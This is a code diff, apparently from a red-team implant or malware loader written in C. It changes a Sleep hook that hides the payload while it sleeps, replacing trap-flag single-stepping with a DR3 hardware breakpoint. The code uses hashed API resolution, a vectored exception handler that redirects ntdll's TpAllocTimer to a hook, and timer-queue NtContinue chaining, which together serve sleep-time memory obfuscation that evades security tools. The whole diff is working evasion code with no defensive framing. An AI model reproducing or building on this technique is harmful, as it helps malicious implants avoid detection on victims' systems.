@@ -48,6 +48,8 @@ typedef struct
 	D_API( RtlCreateTimerQueue );
 	D_API( WaitForSingleObject );
 	D_API( RtlDeleteTimerQueue );
+	D_API( NtGetContextThread );
+	D_API( NtSetContextThread );
 	D_API( SystemFunction032 );
 	D_API( RtlCaptureContext );
 	D_API( RtlInitAnsiString );
@@ -76,6 +78,8 @@ typedef struct
 #define H_API_RTLCREATETIMERQUEUE		0x50ef3c31 /* RtlCreateTimerQueue */
 #define H_API_RTLDELETETIMERQUEUE		0xeec188b0 /* RtlDeleteTimerQueue */
 #define H_API_WAITFORSINGLEOBJECT		0x0df1b3da /* WaitForSingleObject */
+#define H_API_NTGETCONTEXTTHREAD		0x6d22f884 /* NtGetContextThread */
+#define H_API_NTSETCONTEXTTHREAD		0xffa0bf10 /* NtSetContextThread */
 #define H_API_RTLCAPTURECONTEXT			0xeba8d910 /* RtlCaptureContext */
 #define H_API_RTLINITANSISTRING			0xa0c8436d /* RtlInitAnsiString */
 #define H_API_RTLALLOCATEHEAP			0x3be94c5a /* RtlAllocateHeap */
@@ -99,6 +103,57 @@ typedef struct
  *
  * Purpose:
  *
+ * Enables a debug breakpoint at the specified addr.
+ * Uses DR3 to trigger the breakpoint without issue.
+ *
+!*/
+D_SEC( D ) VOID EnableBreakpoint( _In_ PCONTEXT Context, _In_ PVOID Addr )
+{
+	ULONG_PTR	Bit = 0;
+	ULONG_PTR	Msk = 0;
+
+	/* Set DR3 to the specified address */
+	Context->Dr3 = U_PTR( Addr );
+
+	/* Sets DR0-DR3 for HWBP */
+	Msk = ( 1UL << 16 ) - 1UL;
+	Bit = ( Context->Dr7 &~ ( Msk << 16 ) ) | ( 0 << 16 );
+	Context->Dr7 = U_PTR( Bit );
+
+	/* Sets DR3 as enabled */
+	Msk = ( 1UL << 1 ) - 1UL;
+	Bit = ( Context->Dr7 &~ ( Msk << 6 ) ) | ( 1 << 6 );
+	Context->Dr7 = U_PTR( Bit );
+	Context->Dr6 = U_PTR( 0 );
+};
+
+/*!
+ *
+ * Purpose:
+ *
+ * Disables DR3 debug register 
+ *
+!*/
+
+D_SEC( D ) VOID RemoveBreakpoint( _In_ PCONTEXT Context, _In_ PVOID Addr )
+{
+	ULONG_PTR	Msk = 0;
+	ULONG_PTR	Bit = 0;
+
+	/* Disables the DR3 local mode! */
+	Msk = ( 1ULL << 1 ) - 1UL;
+	Bit = ( Context->Dr7 &~ ( Msk << 6 ) ) | ( 0 << 6 );
+	Context->Dr7 = U_PTR( Bit );
+	Context->Dr6 = U_PTR( 0 );
+	Context->Dr3 = U_PTR( 0 );
+
+	__writeeflags( __readeflags() &~ 0x100 );
+};
+
+/*!
+ *
+ * Purpose:
+ *
  * Modifies TpAllocTimer to use a custom thread pool. Inteded to
  * act as a hook for the call RtlCreateTimer and redirected to
  * with a VEH debugger.
@@ -106,11 +161,27 @@ typedef struct
 !*/
 D_SEC( D ) NTSTATUS NTAPI TpAllocTimerHook( _Out_ PTP_TIMER *Timer, _In_ PTP_TIMER_CALLBACK Callback, _Inout_opt_ PVOID Context, _In_opt_ PTP_CALLBACK_ENVIRON CallbackEnviron ) 
 {
+	API		Api;
+	CONTEXT		Ctx;
+
 	PTABLE		Tbl = NULL;
 	NTSTATUS 	Ret = STATUS_SUCCESS;
 
+	/* Zero out stack structures */
+	RtlSecureZeroMemory( &Api, sizeof( Api ) );
+	RtlSecureZeroMemory( &Ctx, sizeof( Ctx ) );
+
+	Api.NtGetContextThread = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTGETCONTEXTTHREAD );
+	Api.NtSetContextThread = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTSETCONTEXTTHREAD );
+
 	/* Get a pointer to Table */
 	Tbl = C_PTR( G_SYM( Table ) );
+
+	/* Remove a breakpoint on the ntdll!TpAllocTimer  */
+	Ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+	Api.NtGetContextThread( NtCurrentThread(), &Ctx );
+	RemoveBreakpoint( &Ctx, C_PTR( PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_STR_TPALLOCTIMER ) ) );
+	Api.NtSetContextThread( NtCurrentThread(), &Ctx );
 
 	/* Execute TpAllocTimer and swap CallbackEnviron with a replacement */
 	Ret = ( ( __typeof__( TpAllocTimerHook ) * ) PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_STR_TPALLOCTIMER ) )(
@@ -118,8 +189,15 @@ D_SEC( D ) NTSTATUS NTAPI TpAllocTimerHook( _Out_ PTP_TIMER *Timer, _In_ PTP_TIM
 
 	);
 
-	/* Re-insert EFLAGS so that the hook can give back control */
-	__writeeflags( __readeflags() | 0x100 );
+	/* Enables a breakpoint on the ntdll!TpAllocTimer */
+	Ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+	Api.NtGetContextThread( NtCurrentThread(), &Ctx );
+	EnableBreakpoint( &Ctx, C_PTR( PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_STR_TPALLOCTIMER ) ) );
+	Api.NtSetContextThread( NtCurrentThread(), &Ctx );
+
+	/* Zero out stack structures */
+	RtlSecureZeroMemory( &Api, sizeof( Api ) );
+	RtlSecureZeroMemory( &Ctx, sizeof( Ctx ) );
 
 	/* Return */
 	return Ret;
@@ -144,21 +222,9 @@ D_SEC( D ) LONG WINAPI VehDebugger( _In_ PEXCEPTION_POINTERS ExceptionIf )
 	/* Is the thread where our debugger comes from ? */
 	if ( Tbl->Table->ClientId.UniqueThread == NtCurrentTeb()->ClientId.UniqueThread ) {
 		if ( ExceptionIf->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP ) {
-			if ( U_PTR( ExceptionIf->ExceptionRecord->ExceptionAddress ) == U_PTR( PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLREMOVEVECTOREDEXCEPTIONHANDLER ) ) ) 
-			{
-				/* Removes the trap flag from ELFAGS */
-				ExceptionIf->ContextRecord->EFlags = ExceptionIf->ContextRecord->EFlags &~ 0x100;
-			} else if ( U_PTR( ExceptionIf->ExceptionRecord->ExceptionAddress ) == U_PTR( PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_STR_TPALLOCTIMER ) ) ) 
-			{
-				/* Redirect TpAllocTimer -> TpAllocTimerHook. Removes EFLAGS, must restore manually */
+			if ( U_PTR( ExceptionIf->ExceptionRecord->ExceptionAddress ) == U_PTR( PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_STR_TPALLOCTIMER ) ) ) {
+				/* Redirect TpAllocTimer -> TpAllocTimerHook */
 				ExceptionIf->ContextRecord->Rip = U_PTR( G_SYM( TpAllocTimerHook ) );
-
-				/* Removes the trap flag from EFLAGS */
-				ExceptionIf->ContextRecord->EFlags = ExceptionIf->ContextRecord->EFlags &~ 0x100;
-			} else
-			{
-				/* Re-insert the single step instruction! */
-				ExceptionIf->ContextRecord->EFlags |= 0x100;
 			};
 			/* Notify! */
 			Ret = EXCEPTION_CONTINUE_EXECUTION;
@@ -232,6 +298,7 @@ D_SEC( D ) VOID WINAPI Sleep_Hook( _In_ DWORD DelayTime )
 	USTRING			Key;
 	USTRING			Buf;
 	CONTEXT			Ctx;
+	CONTEXT			Brk;
 	ANSI_STRING		Ani;
 	UNICODE_STRING		Uni;
 
@@ -268,6 +335,7 @@ D_SEC( D ) VOID WINAPI Sleep_Hook( _In_ DWORD DelayTime )
 	RtlSecureZeroMemory( &Key, sizeof( Key ) );
 	RtlSecureZeroMemory( &Buf, sizeof( Buf ) );
 	RtlSecureZeroMemory( &Ctx, sizeof( Ctx ) );
+	RtlSecureZeroMemory( &Brk, sizeof( Brk ) );
 	RtlSecureZeroMemory( &Ani, sizeof( Ani ) );
 	RtlSecureZeroMemory( &Uni, sizeof( Uni ) );
 
@@ -279,6 +347,8 @@ D_SEC( D ) VOID WINAPI Sleep_Hook( _In_ DWORD DelayTime )
 	Api.RtlInitUnicodeString              = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLINITUNICODESTRING ); 
 	Api.RtlCreateTimerQueue               = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLCREATETIMERQUEUE );
 	Api.RtlDeleteTimerQueue               = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLDELETETIMERQUEUE );
+	Api.NtGetContextThread                = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTGETCONTEXTTHREAD );
+	Api.NtSetContextThread                = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTSETCONTEXTTHREAD );
 	Api.RtlCaptureContext                 = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLCAPTURECONTEXT );
 	Api.RtlInitAnsiString                 = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLINITANSISTRING );
 	Api.RtlAllocateHeap                   = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLALLOCATEHEAP );
@@ -381,8 +451,11 @@ D_SEC( D ) VOID WINAPI Sleep_Hook( _In_ DWORD DelayTime )
 				SetThreadpoolCallbackPool( & Tbl->Table->Debugger.PoolEnv, Pol );
 				SetThreadpoolCallbackCleanupGroup( & Tbl->Table->Debugger.PoolEnv, Cln, NULL );
 
-				/* Add trap flag to EFLAGS */
-				__writeeflags( __readeflags() | 0x100 );
+				/* Add breakpoint on ntdll!TpAllocTimer */
+				Brk.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+				Api.NtGetContextThread( NtCurrentThread(), &Brk );
+				EnableBreakpoint( &Brk, C_PTR( PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_STR_TPALLOCTIMER ) ) );
+				Api.NtSetContextThread( NtCurrentThread(), &Brk );
 
 				if ( NT_SUCCESS( Api.RtlCreateTimerQueue( &Que ) ) ) {
 
@@ -482,6 +555,12 @@ D_SEC( D ) VOID WINAPI Sleep_Hook( _In_ DWORD DelayTime )
 								if ( ! NT_SUCCESS( Api.RtlCreateTimer( Que, &Tmr, Api.NtContinue, Res, Del += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) break;
 								if ( ! NT_SUCCESS( Api.RtlCreateTimer( Que, &Tmr, Api.NtContinue, End, Del += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) break;
 
+								/* Remove the breakpoint on ntdll!TpAllocTimer */
+								Brk.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+								Api.NtGetContextThread( NtCurrentThread(), &Brk );
+								RemoveBreakpoint( &Brk, C_PTR( PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_STR_TPALLOCTIMER ) ) );
+								Api.NtSetContextThread( NtCurrentThread(), &Brk );
+
 								/* Remove the Vectored Exception Handler! */
 								if ( Api.RtlRemoveVectoredExceptionHandler( Veh ) ) {
 									/* Execute and await the frame results! */
@@ -527,6 +606,13 @@ D_SEC( D ) VOID WINAPI Sleep_Hook( _In_ DWORD DelayTime )
 				Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, End );
 			};
 			if ( Veh != NULL ) {
+
+				/* Remove the breakpoint on ntdll!TpAllocTimer */
+				Brk.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+				Api.NtGetContextThread( NtCurrentThread(), &Brk );
+				RemoveBreakpoint( &Brk, C_PTR( PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_STR_TPALLOCTIMER ) ) );
+				Api.NtSetContextThread( NtCurrentThread(), &Brk );
+
 				/* Remove the Vectored Exception Handler */
 				Api.RtlRemoveVectoredExceptionHandler( Veh );
 			};
